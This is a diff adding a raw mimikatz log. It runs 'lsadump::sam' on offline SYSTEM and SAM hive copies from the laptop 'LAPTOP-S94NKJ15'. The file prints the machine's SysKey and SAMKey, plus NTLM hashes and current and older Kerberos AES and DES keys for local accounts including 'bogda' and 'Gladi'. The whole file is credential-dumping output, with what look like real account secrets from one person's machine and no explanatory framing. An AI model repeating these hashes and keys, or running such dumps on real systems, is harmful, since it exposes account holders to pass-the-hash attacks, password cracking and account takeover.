@@ -1,0 +1,110 @@
+mimikatz # Using 'hash.txt' for logfile : OK
+
+mimikatz # lsadump::sam SystemBkup.hiv SamBKup.hiv
+Domain : LAPTOP-S94NKJ15
+SysKey : 838b30c5c88081c1291a9d9079059901
+Local SID : S-1-5-21-393682922-2799023920-923165551
+
+SAMKey : 02612545894aa3806c03c7ac7feb9314
+
+RID  : 000001f4 (500)
+User : Administrator
+
+RID  : 000001f5 (501)
+User : Guest
+
+RID  : 000001f7 (503)
+User : DefaultAccount
+
+RID  : 000001f8 (504)
+User : WDAGUtilityAccount
+  Hash NTLM: 69dbee1a98d4f53fbccb1fe5ce37c851
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : e9b0f8fbd777e3589bef64b8fb3c4561
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : WDAGUtilityAccount
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 4d2247927a0c04ec09b66d03e7ed55b1a0bbd45970c4eece65a6ab00e9d6859a
+      aes128_hmac       (4096) : 5d8ecf3576c098645e45a3281ccc309d
+      des_cbc_md5       (4096) : 9d92adfd02cb54e5
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : WDAGUtilityAccount
+    Credentials
+      des_cbc_md5       : 9d92adfd02cb54e5
+
+
+RID  : 000003e9 (1001)
+User : bogda
+  Hash NTLM: 1e86389af3a9415fc72d0beb82b11850
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 20676b1af95f9ae4c3c1cac47f9d298e
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : LAPTOP-S94NKJ15bogda
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 22cca0ef392ac211ab649541fd5d6045285971ab22e2c3e5b157aed17b0e6af3
+      aes128_hmac       (4096) : 0075a9856fea066487064da010bbcf5a
+      des_cbc_md5       (4096) : 3801fd1cd6f297cb
+    OldCredentials
+      aes256_hmac       (4096) : cc03fe510466ab76380bdb62bc80e2bef07e664b365669ef1ea3e696bbfb5707
+      aes128_hmac       (4096) : 91ef8624877e565821a6002fdd96824d
+      des_cbc_md5       (4096) : baf12cc4833b76e6
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : LAPTOP-S94NKJ15bogda
+    Credentials
+      des_cbc_md5       : 3801fd1cd6f297cb
+    OldCredentials
+      des_cbc_md5       : baf12cc4833b76e6
+
+
+RID  : 000003ea (1002)
+User : Gladi
+  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : a5059d71e174f5d0f647f980dee125e0
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : LAPTOP-S94NKJ15Gladi
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : d2d726bfffd66b1d8da51e17fbcd48b0ed884d812274f1165755fe943b35e876
+      aes128_hmac       (4096) : 6c9145391d53f7535fb0284bed9cee5e
+      des_cbc_md5       (4096) : 083834138cfb07b6
+    OldCredentials
+      aes256_hmac       (4096) : 2df247f0794c55f854cf2bfa6157c39f5484f1bf9b87efe08e4b3f0e1074fb09
+      aes128_hmac       (4096) : 43158c9dc6c8fcb4aed1e0a1a738ab22
+      des_cbc_md5       (4096) : fb51e54004bf0da2
+    OlderCredentials
+      aes256_hmac       (4096) : 601f41554b2446c0ea6c97578367796eae719e5811b4439ac9e447e7fa92ead0
+      aes128_hmac       (4096) : ca477afe87faf9d7f2b35479938d24fe
+      des_cbc_md5       (4096) : b076d9c740c25b70
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : LAPTOP-S94NKJ15Gladi
+    Credentials
+      des_cbc_md5       : 083834138cfb07b6
+    OldCredentials
+      des_cbc_md5       : fb51e54004bf0da2
+
+
+mimikatz # 
